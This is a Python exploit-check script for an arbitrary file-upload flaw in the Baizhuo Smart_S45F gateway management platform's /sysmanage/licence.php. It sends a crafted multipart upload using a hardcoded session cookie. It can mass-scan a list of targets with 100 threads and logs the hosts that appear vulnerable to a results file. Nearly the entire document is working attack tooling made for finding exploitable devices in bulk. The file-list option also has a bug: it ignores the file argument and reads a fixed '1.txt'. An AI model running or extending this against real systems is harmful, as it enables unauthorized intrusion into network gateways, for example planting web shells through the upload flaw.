import requests,argparse,sys,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
    ____        _ _____   __              
   / __ )____ _(_)__  /  / /_  __  ______ 
  / __  / __ `/ /  / /  / __ \/ / / / __ \
 / /_/ / /_/ / /  / /__/ / / / /_/ / /_/ /
/_____/\__,_/_/  /____/_/ /_/\__,_/\____/ 
                                          
"""
    print(test)

def main():
    banner()
    parse = argparse.ArgumentParser(description="百卓Smart_S45F网关智能管理平台/sysmanage/licence.php文件上传")
    parse.add_argument('-u', '--url', dest='url', type=str, help="input your url")
    parse.add_argument('-f', '--file', dest='file', type=str, help="input your file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open('1.txt', 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/sysmanage/licence.php"
    headers = {
        'Cookie': 'PHPSESSID=b11375c64210599a5bf9a99744783d48',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Referer': 'https://localhost/sysmanage/licence.php',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Te': 'trailers',
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=---------------------------42328904123665875270630079328',
    }
    data = (
        '-----------------------------42328904123665875270630079328\r\n'
        'Content-Disposition: form-data; name="ck"\r\n\r\n'
        'radhttp\r\n'
        '-----------------------------42328904123665875270630079328\r\n'
        'Content-Disposition: form-data; name="file_upload"; filename="readme.txt"\r\n'
        'Content-Type: application/octet-stream\r\n\r\n'
        '123321\r\n'
        '-----------------------------42328904123665875270630079328\r\n'
        'Content-Disposition: form-data; name="hid_tftp_ip"\r\n\r\n\r\n'
        '-----------------------------42328904123665875270630079328\r\n'
        'Content-Disposition: form-data; name="hid_ftp_ip"\r\n\r\n\r\n'
        '-----------------------------42328904123665875270630079328\r\n'
        'Content-Disposition: form-data; name="mode"\r\n\r\n'
        'set\r\n'
        '-----------------------------42328904123665875270630079328--'
    ).encode('utf-8')
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,)
        if res.status_code == 200 and 'licence.php' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == "__main__":
    main()